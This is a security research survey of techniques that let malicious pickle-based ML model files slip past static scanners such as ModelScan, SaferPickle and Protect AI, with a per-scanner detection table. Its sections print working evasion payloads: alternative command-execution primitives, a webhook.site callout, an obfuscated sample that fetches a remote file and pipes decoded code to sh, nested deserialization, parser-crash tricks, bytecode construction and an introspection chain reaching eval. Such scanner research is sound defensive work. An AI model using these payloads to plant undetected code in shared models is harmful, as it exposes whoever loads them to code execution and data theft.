# A Taxonomy of Static-Scanner Evasion Techniques

We systematically categorized static scanner evasion techniques by method. This survey was conducted as of February 25, 2026. The target scanners are Protect AI, JFrog, and ClamAV on Hugging Face, as well as the open-source SaferPickle and ModelScan. The open-source scanners used were the latest versions available at that time: ModelScan 0.8.8 and SaferPickle (commit 88564e07dbefff58d1bc7571cce01accd394b102). Allowlist-based scanners (fickling and HF PickleScan) are excluded, and VirusTotal is also excluded due to its extremely low detection rate.

The Python code shown in this section is decompiled from pickle files (or pickle files inside zip archives) with fickling.

## Overview

The table below summarizes each evasion technique's novelty and per-scanner detection result. "Concept known" means the high-level concept appears in prior work, but the specific techniques listed below are new. "Known" means the technique itself was previously documented (see inline references in each section). "D" (Detected) means the scanner flags the sample. "E" (Evaded) means it does not. "P (X/8)" (Partial) appears only for the Obfuscation row, indicating X out of 8 samples were flagged.

Note that the novelty assessment in this section is based on publicly available papers, advisories, and technical articles found online. The search was best-effort, and unidentified prior work may exist, so the assessment is not definitive.

| # | Technique | Novelty | Protect AI | JFrog | ClamAV | SaferPickle | ModelScan |
|---|-----------|---------|------------|-------|--------|-------------|-----------|
| 1 | [Alternative Execution Primitives (3 command-execution examples)](#alternative-execution-primitives) | Concept known | E | E | E | E | E |
| 2 | [Alternative Execution Primitives (external communication: pandas.read_csv)](#alternative-execution-primitives) | Concept known | D | E | E | E | E |
| 3 | [Nested Deserialization (YAML)](#nested-deserialization-variant) | Concept known | E | D | E | D | E |
| 4 | [Nested Deserialization (Pickle)](#nested-deserialization-variant) | Concept known | E | E | D | D | E |
| 5 | [Scanner-side Parsing: zipfile Exceptions](#zipfile-exceptions) | Known | D | E | D | E | E |
| 6 | [Scanner-side Parsing: pickletools Exceptions](#pickletools-exceptions) | Known | D | D | D | E | E |
| 7 | [Scanner-side Parsing: Invalid Memo Reference](#invalid-memo-reference) | Concept known | D | E | D | D | E |
| 8 | [Scanner-side Parsing: Type-Confused Stack (bytes)](#type-confused-stack-operands) | Concept known | D | E | E | D | E |
| 9 | [Scanner-side Parsing: Type-Confused Stack (int)](#type-confused-stack-operands) | Concept known | D | E | D | D | E |
| 10 | [Scanner-side Parsing: Unhashable Type on Stack](#unhashable-type-on-stack) | Concept known | D | E | D | D | E |
| 11 | [Obfuscation](#obfuscation) | Concept known | P (2/8) | P (3/8) | P (1/8) | P (2/8) | P (3/8) |
| 12 | [Pickle's Python 2 Compatibility Mapping](#pickles-python-2-compatibility-mapping) | Novel | E | E | E | D | E |
| 13 | [CodeType/FunctionType: Basic](#codetypefunctiontype-construction) | Concept known | E | E | E | D | E |
| 14 | [CodeType/FunctionType: Indirect Variant](#indirect-variant) | Concept known | E | E | E | D (downgraded) | E |
| 15 | [CodeType/FunctionType: Marshal Variant](#marshal-variant) | Known | E | E | D | D | E |
| 16 | [Uncommon Opcodes: EXT2 + copyreg.add_extension](#ext2-opcode-with-copyregadd_extension) | Concept known | E | E | E | D | E |
| 17 | [Uncommon Opcodes: INST + Memo Indirection](#inst-opcode-with-memo-indirection) | Concept known | E | E | E | D | E |
| 18 | [Python Introspection Chain](#python-introspection-chain) | Concept known | E | E | E | D | E |
| 19 | [Indirect Model Loading](#indirect-model-loading) | Known | D | D | E | E | E |
| 20 | [File Extension and Format Mismatch](#file-extension-and-format-mismatch) | Known | D | E | D | D | E |
| 21 | [Old Format](#old-format) | Known | D | E | D | D | E |

What emerges from this detailed survey is the inherent limitation of static-scanner pattern matching. Even when an evasion technique is conceptually known, no scanner covers every concrete variant. Moreover, even fully known techniques previously published in prior work are still missed by multiple scanners.

## Alternative Execution Primitives

Attackers simply use alternative methods to evade denylisted function calls.
For example, calling different methods rather than `os.system` or `subprocess.run` for command execution. This is a known technique; similar alternative functions are referred to as "attack gadgets" in prior [research](https://arxiv.org/abs/2508.19774) by Liu et al.

```python
from torch.library import torch.utils.collect_env.run
_var0 = torch.utils.collect_env.run('rm pwnd.txt')
```

```python
from multiprocessing.util import spawnv_passfds
_var0 = spawnv_passfds(b'/bin/sh', ('/bin/sh', '-c', 'echo bypass > /Users/hoge/spawnv_passfds_marker.txt'), ())
```

```python
from mlflow.projects.backend.local import _run_entry_point
_var0 = _run_entry_point('echo "You\'ve been pwned."', '.', '', '')
```

Beyond command execution, we've also seen cases of communicating with external servers while evading denylist detection for `httplib` and `requests` modules.

```python
from pandas.io.parsers.readers import read_csv
_var0 = read_csv('https://webhook.site/d8bacf61-b843-4a4b-bf92-cc0cde71962e?pwned=pandas_bypass&file=data.csv')
```

Alternative Execution Primitives is deceptively simple yet highly evasive. In fact, the three command execution examples above evade all evaluated scanners (the external-communication case evades all scanners except Protect AI). The set of evaded scanners varies depending on which package is used as the alternative primitive.

### Nested Deserialization Variant

The malicious payload is embedded inside the argument of a deserialization function call. Scanners only inspect pickle-level globals and do not recursively parse the nested payload.

In the YAML variant, `yaml.load` with `UnsafeLoader` deserializes a YAML string containing `!!python/object/apply:os.system`. This technique evades Protect AI, ClamAV, and ModelScan.

```python
from yaml import load
from yaml.loader import UnsafeLoader
_var0 = load('\n!!python/object/apply:os.system ["id"]\n', UnsafeLoader)
```

In the pickle variant, `torch.storage._load_from_bytes` internally calls `torch.load(io.BytesIO(b), weights_only=False)` on its argument. The `weights_only=False` allows arbitrary code execution, and the argument contains a second pickle payload with `builtins.exec`. This technique evades Protect AI, JFrog, and ModelScan.

```python
from torch.storage import _load_from_bytes
_var0 = _load_from_bytes(b"\x80\x04cbuiltins\nexec\n(\x8c\x19import os;os.system('ls')tR...")
```

YAML unsafe deserialization is a well-known security issue. The PyYAML [documentation](https://pyyaml.org/wiki/PyYAMLDocumentation) itself notes that `yaml.load` is as powerful as `pickle.load` and can call any Python function. However, we have not found public references for the evasion technique that exploits pickle-based model scanners' failure to recursively parse nested YAML payloads or second-stage pickle payloads, particularly the `torch.storage._load_from_bytes` variant.

## Scanner-side Parsing Path Exceptions

Attackers craft code that causes exceptions in the static scanner's logic to bypass detection.

### `zipfile` Exceptions

Prior [research](https://arxiv.org/abs/2508.19774) by Liu et al. has shown that PyTorch's custom Zip extractor differs from the standard `ZipFile` library used by static scanners. A crafted model can exploit this gap to crash the scanner via `zipfile` exceptions while PyTorch loads it normally. The following output is from running SaferPickle against such a crafted model:

```python
% python cli.py --directory ../models--tmadge--research/snapshots/3a113b8a20987956318617906c64e71fa6cb140d/
Traceback (most recent call last):
  File "/Users/hoge/existing_scanners/saferpickle/cli.py", line 220, in <module>
    app.run(main)
..(omitted)..
  File "/Users/hoge/existing_scanners/saferpickle/lib/utils.py", line 186, in extract_zip_contents
    contents.append((filename, zf.read(filename)))
  File "/Users/hoge/.pyenv/versions/3.10.15/Library/Frameworks/Python.framework/Versions/3.10/lib/python3.10/zipfile.py", line 1486, in read
    with self.open(name, "r", pwd) as fp:
  File "/Users/hoge/.pyenv/versions/3.10.15/Library/Frameworks/Python.framework/Versions/3.10/lib/python3.10/zipfile.py", line 1567, in open
    raise BadZipFile(
zipfile.BadZipFile: File name in directory 'does_not_scan_but_opens_in_torch/data.pkl' and header b'does_not_scan_but_opens_in_torch/data.pal' differ.
```

SaferPickle, ModelScan, and JFrog are all vulnerable to this technique.

### `pickletools` Exceptions

Appending a truncated opcode (e.g., `BINUNICODE` 0x58 without its required 4-byte length prefix) after the malicious payload causes a `ValueError` in the `pickletools` module. The `pickle` module executes opcodes sequentially, so the payload runs at `REDUCE` before the corrupted tail is ever reached.

```python
     0: 80 PROTO           2
     2: 63 GLOBAL          'builtins exec'
    17: 28 MARK
    18: 58 BINUNICODE      "\nf = open('my_file.txt', 'a'); f.write('Malicious'); f.close()"
    85: 74 TUPLE
    86: 52 REDUCE
    87: 58 ???
    88: 2e ???
[!] pickletools.genops failed at offset 87: not enough data in stream to read uint4
```

This technique was first reported by [ReversingLabs](https://www.reversinglabs.com/blog/rl-identifies-malware-ml-model-hosted-on-hugging-face) as an evasion against Picklescan, which has since been patched. However, it still evades ModelScan and SaferPickle.

### Scanner-Specific Exceptions

These samples do not corrupt the opcode stream itself. Instead, they append deliberately malformed operands after the malicious `GLOBAL` + `REDUCE` payload, triggering unhandled exceptions in the scanners' own `STACK_GLOBAL` resolution logic. The payload executes at `REDUCE` before the malformed tail is ever reached by the pickle runtime.

#### Invalid Memo Reference

`BINGET 3` references a memo key that was never stored. Scanners that resolve memo references internally raise `KeyError`. This technique evades JFrog and ModelScan.

```python
   0: 80 PROTO           4
   2: 63 GLOBAL          'os system'
  13: 56 UNICODE         'touch /tmp/pwned-by-keyerror'
  43: 85 TUPLE1
  44: 52 REDUCE
  45: 30 POP
  46: 8c SHORT_BINUNICODE 'os'
  50: 94 MEMOIZE          # memo[0] = 'os'
  51: 68 BINGET           3   # memo[3] does not exist → KeyError
  53: 68 BINGET           0
  55: 93 STACK_GLOBAL
  56: 4b BININT1          66
  58: 2e STOP
```

#### Type-Confused Stack Operands

Pushing a non-string type onto the stack as a `STACK_GLOBAL` operand causes `TypeError` when the scanner performs string operations on the module name. This technique has variants using `bytes`, `int`, and other types. The `bytes` variant evades JFrog, ClamAV, and ModelScan; the `int` variant evades JFrog and ModelScan.

```python
   0: 80 PROTO           4
   2: 63 GLOBAL          'os system'
  13: 56 UNICODE         "echo 'pwned by type confusion'"
  45: 85 TUPLE1
  46: 52 REDUCE
  47: 30 POP
  48: 43 SHORT_BINBYTES   b'os'   # bytes, not str
  52: 70 PUT              1
  55: 8c SHORT_BINUNICODE 'system'
  63: 70 PUT              2
  66: 67 GET              1
  69: 67 GET              2
  72: 93 STACK_GLOBAL             # (b'os', 'system')
  73: 2e STOP
```

```python
   0: 80 PROTO           4
   2: 63 GLOBAL          'os system'
  13: 56 UNICODE         "echo 'pwned by type confusion'"
  45: 85 TUPLE1
  46: 52 REDUCE
  47: 30 POP
  48: 4b BININT1          66
  50: 4a BININT           42     # int, not str
  55: 94 MEMOIZE
  56: 8c SHORT_BINUNICODE 'os'
  60: 94 MEMOIZE
  61: 68 BINGET           0
  63: 68 BINGET           1
  65: 93 STACK_GLOBAL             # (42, 'os')
  66: 2e STOP
```

#### Unhashable Type on Stack

`BYTEARRAY8` pushes `bytearray(b'system')` onto the stack. Since `bytearray` is mutable and unhashable, scanners that collect globals into a `set` raise `TypeError: unhashable type: 'bytearray'`. This technique evades JFrog and ModelScan.

```python
   0: 80 PROTO           5
   2: 63 GLOBAL          'os system'
  13: 56 UNICODE         "echo 'pwned by unhashable bytearray'"
  51: 85 TUPLE1
  52: 52 REDUCE
  53: 30 POP
  54: 96 BYTEARRAY8      bytearray(b'system')
  69: 70 PUT             1
  72: 8c SHORT_BINUNICODE 'os'
  76: 70 PUT             2
  79: 67 GET             2
  82: 67 GET             1
  85: 93 STACK_GLOBAL    # ('os', bytearray(b'system'))
  86: 2e STOP
```

## Obfuscation

Attackers obfuscate their code to evade denylist string pattern matching. Obfuscation and encoding techniques for scanner evasion were previously documented by [Trail of Bits](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-2/).

```python
from zlib import decompress
_var0 = decompress(b'x\xda\xbdWmk\xe3F\x10\xfe...(truncated)...ze10')
_var1 = exec(_var0)
```

Most models simply execute strings decoded with well-known algorithms like `base64` or `zlib`, but some use custom algorithms or rely on external files. For instance, the code below concatenates words from a Hugging Face-hosted text file, then base64-decodes the combined string.

```python
from yaml import unsafe_load
_var0 = unsafe_load("!!python/object/apply:torch.hub.download_url_to_file\nargs: ['https://huggingface.co/datasets/dtonala/vt-test/raw/main/labels.txt', '/tmp/labels.txt']\nkwds: {'progress': False}")
from yaml import unsafe_load
_var1 = unsafe_load('!!python/object/new:os.system \nargs: [echo ZiA9IG9wZW4oImxhYmVscy50eHQiLCAiciIpOyBwcmludCgiIi5qb2luKFt3b3JkWzBdIGZvciB3b3JkIGluIGYucmVhZCgpLnNwbGl0KCldKSkK | base64 -d | python - | base64 -d | sh]\n')
```

We identified eight obfuscated malicious model files during evaluation. While these samples included obviously unsafe primitives such as `os.system` and `subprocess`, only a few out of eight were explicitly labeled as `unsafe` by each scanner: Protect AI (2), JFrog (3), ClamAV (1), SaferPickle (2), and ModelScan (3).

## Pickle’s Python 2 Compatibility Mapping

Attackers specify `commands` in the pickle file's `GLOBAL` opcode instead of the more easily detected `subprocess`.

```python
from commands import run
_var0 = run(['echo "Malicious PyTorch model executed!"'])
```

In `Unpickler.find_class`, if `protocol` < 3 and `fix_imports` is `True`, the pickle module [uses](https://github.com/python/cpython/blob/main/Lib/pickle.py#L1716) `_compat_pickle.IMPORT_MAPPING` to remap module names. As a result, `commands` gets [mapped](https://github.com/python/cpython/blob/main/Lib/_compat_pickle.py#L44C6-L44C14) to `subprocess`.

This evasion technique is effective against all scanners except SaferPickle.

## CodeType/FunctionType Construction

This technique constructs a code object with attacker-controlled bytecode using `CodeType`, wraps it into a callable via `FunctionType`, and immediately invokes it. The malicious logic is embedded in raw bytecode, avoiding commonly flagged patterns such as direct `os.system` or `exec` calls.
In the basic form, both types are imported directly from the types module. This evades all scanners except SaferPickle.

```python
from types import FunctionType
from types import CodeType
_var0 = CodeType(0, 0, 0, 1, 3, 67, b'd\x01d\x00l\x00}\x00|\x00\xa0\x01d\x02\xa1\x01\x01\x00d\x00S\x00', (None, 0, 'echo pwned > pwned_stealthy.txt'), ('os', 'system'), ('os',), '/home/tanming/malware_model_format/pickleCloak_new/generate_stealthy.py', 'payload_func', 11, b'\x08\x01\x0e\x01', (), ())
_var1 = FunctionType(_var0, {})
```

### Indirect Variant

A more evasive form avoids importing `CodeType`/`FunctionType` by name, instead obtaining them via runtime introspection on an arbitrary function:

```python
from copy import copy
_var0 = type(copy)
from operator import methodcaller
_var1 = methodcaller('__getattribute__', '__code__')
from copy import copy
_var2 = _var1(copy)
_var3 = type(_var2)
_var4 = _var3(0, 0, 0, 1, 3, 67, b'd\x01d\x00l\x00}\x00|\x00\xa0\x01d\x02\xa1\x01\x01\x00d\x00S\x00', (None, 0, 'echo pwned > pwned_stealthy.txt'), ('os', 'system'), ('os',), '/home/tanming/malware_model_format/pickleCloak_new/generate_stealthy.py', 'payload_func', 11, b'\x08\x01\x0e\x01', (), ())
_var5 = _var0(_var4, {})
```

Any regular Python function can serve as the donor; `copy.copy` is used here, but the choice is arbitrary. This evades static scanners that rely on detecting `from types import CodeType/FunctionType` as a signature. SaferPickle still detects this variant, but downgrades the result from `unsafe` to `suspicious`.

### Marshal Variant

Instead of constructing a code object directly with `CodeType`, this variant uses `marshal.loads` to deserialize a pre-built code object from raw bytes. The malicious bytecode is opaque to scanners since it is embedded in the serialized blob rather than appearing as explicit `CodeType` arguments. This variant was originally documented by [Trail of Bits](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-2/) and still evades Protect AI, JFrog, and ModelScan.

```python
from types import FunctionType
from marshal import loads
_var0 = loads(b'\xe3\x00...')
_var1 = FunctionType(_var0, {})
_var2 = _var1()
```

## Uncommon Opcodes

Attackers can evade static scanners by using pickle opcodes that are rarely seen in legitimate models and therefore not implemented or inspected by scanners.

### `EXT2` Opcode with `copyreg.add_extension`

This technique exploits the pickle extension registry mechanism to invoke a dangerous function indirectly, without any of the opcodes that scanners typically monitor.

```python
   2: GLOBAL     'copyreg add_extension'
  25: BINUNICODE 'multiprocessing.util'
  50: BINUNICODE 'spawnv_passfds'
  69: BININT2    31337
  73: REDUCE                              # registers spawnv_passfds as extension code 31337
      ...
   75: EXT2       31337                   # resolves to spawnv_passfds via the registry
   78: BINBYTES   b'/bin/sh'
   91: BINUNICODE '/bin/sh'
  103: BINUNICODE '-c'
  110: BINUNICODE 'echo hidden spawnv autoreg bypass > ...'
  221: REDUCE                              # executes the shell command
```

The payload first calls `copyreg.add_extension` to register `spawnv_passfds` under an arbitrary extension code, then invokes it via `EXT2`. Since the actual dangerous callable never
appears in a `GLOBAL` or `STACK_GLOBAL` opcode, pattern-based scanners do not flag it. Fickling fails to parse this payload entirely, raising `NotImplementedError: TODO: Add
support for Opcode EXT2`.

This evasion technique is effective against all scanners except SaferPickle.

### `INST` Opcode with Memo Indirection

This technique uses the `INST` opcode — an old protocol 0 instruction rarely seen in modern pickle files — to dynamically construct the target module name and pass it to
`STACK_GLOBAL` through the memo, bypassing pattern-based detection.

```python
   0: PROTO           4
   2: MARK
   3: SHORT_BINUNICODE 'os'
   7: INST            'builtins str'       # calls builtins.str('os') → returns 'os'
  21: BINPUT          0                    # stores 'os' in memo[0]
  23: BINGET          0                    # pushes memo[0] ('os') onto the stack
  25: SHORT_BINUNICODE 'system'
  33: STACK_GLOBAL                         # resolves os.system via memo-supplied module name
  34: SHORT_BINUNICODE 'echo "You\'ve been pwned".'
  61: TUPLE1
  62: REDUCE                              # executes the shell command
      ...                                 # (remaining opcodes build a legitimate model object)
  88: STOP
```

`INST 'builtins str'` calls the safe type constructor `builtins.str('os')`, which returns the string `'os'` and pushes it onto the stack. The result is then stored in the memo via
`BINPUT` and retrieved via `BINGET`, so that the module name reaching `STACK_GLOBAL` comes through memo indirection rather than a direct string push. This combination prevents scanners
from associating the module name `os` with the `STACK_GLOBAL` opcode.

This evasion technique is effective against all scanners except SaferPickle.

## Python Introspection Chain

This technique exploits Python's introspection — the ability to inspect object attributes, types, and class hierarchies at runtime — to reach dangerous functions from safe
starting points, without importing any blocked module.

```python
 11: GLOBAL     'builtins __setattr__'
   33: MEMOIZE                             # memo[0] = __setattr__
   34: GLOBAL     'builtins print.__class__.__base__.__subclasses__'
   84: EMPTY_TUPLE
   85: REDUCE                              # object.__subclasses__() → list of all subclasses
   86: MEMOIZE                             # memo[1] = subclasses list
   87: BINGET     0                        # push __setattr__
   89: SHORT_BINUNICODE 'subclasses'
  101: BINGET     1                        # push subclasses list
  104: TUPLE2
  105: REDUCE                              # builtins.subclasses = subclasses list
  106: GLOBAL     'builtins subclasses.__getitem__'
  138: BININT1    137
  140: TUPLE1
  141: REDUCE                              # subclasses[137] → gadget class
  142: MEMOIZE                             # memo[2] = gadget class
  143: BINGET     0                        # push __setattr__
  145: SHORT_BINUNICODE 'gadget'
  153: BINGET     2                        # push gadget class
  155: TUPLE2
  156: REDUCE                              # builtins.gadget = gadget class
  157: GLOBAL     'builtins gadget.__init__.__builtins__.__getitem__'
  208: SHORT_BINUNICODE 'eval'
  214: TUPLE1
  215: REDUCE                              # __builtins__['eval'] → eval function
  216: MEMOIZE                             # memo[3] = eval
  217: BINGET     3                        # push eval
  219: SHORT_BINUNICODE '__import__("os").system("touch /tmp/oicu")'
  263: TUPLE1
  264: REDUCE                              # eval('__import__("os").system(...)')
  265: STOP
```

Every `GLOBAL` opcode references only `builtins`, which scanners allow because it contains safe type constructors like `str` and `int`. The payload uses `builtins.__setattr__` to inject
computed values (such as a `subclass` list and a `gadget` class) back into the `builtins` namespace, making them accessible to subsequent `GLOBAL` lookups. Through this
inject-then-lookup cycle, the payload chains from a safe builtin (`print`) to `object.__subclasses__()`, selects a class whose `__init__.__builtins__` dict is accessible, extracts `eval`, and executes arbitrary code.

The general introspection chain reaching `eval` through `__subclasses__` / `__builtins__` is a known technique close to [Pain Pickle](https://ieeexplore.ieee.org/document/10062403), but its application to ML model static scanner evasion appears to be new.

This evasion technique is effective against all scanners except SaferPickle.

## Indirect Model Loading

One downloader sample attempted to load another malicious model from the Hugging Face Hub, although that model is currently unavailable. While Hub downloads are common in normal inference or training code, they are unusual during model loading.

```python
from transformers.models.auto.auto_factory import getattribute_from_module
from transformers.models.auto.tokenization_auto import AutoTokenizer
_var0 = getattribute_from_module(AutoTokenizer, 'from_pretrained')
_var1 = _var0('zpbrent/reuse')
```

This evasion technique was [introduced](https://jfrog.com/blog/jfrog-and-hugging-face-join-forces/) by JFrog but is still effective against all scanners except Protect AI and JFrog.

## File Extension and Format Mismatch

A raw pickle file with a PyTorch-associated extension (`.bin`, `.pt`, `.pth`, `.ckpt`) exploits extension-based scanner routing. ModelScan maps these extensions to `PyTorchUnsafeOpScan`, which expects a ZIP archive with the PyTorch magic number. Since a raw pickle file lacks this magic number, the scanner skips the file as invalid without falling back to the plain pickle scanner. `torch.load()` accepts both ZIP archives and raw pickle files, so the payload executes normally. The same class of issue was previously reported in picklescan as [GHSA-jgw4-cr84-mqxg](https://github.com/mmaitre314/picklescan/security/advisories/GHSA-jgw4-cr84-mqxg). This technique evades JFrog and ModelScan.

## Old Format

Attackers can evade detection by packaging malicious pickle code in legacy model file formats. For example, PyTorch originally used the TAR archive format before switching to ZIP-based archives by default in v1.6. While `torch.load()` transparently handles both formats, some scanners such as ModelScan and JFrog cannot analyze pickle files inside TAR archives. ModelScan's source code explicitly acknowledges this gap:

```python
        # try loading from tar
        try:
            # TODO: implement loading from tar
            raise TarError()
```
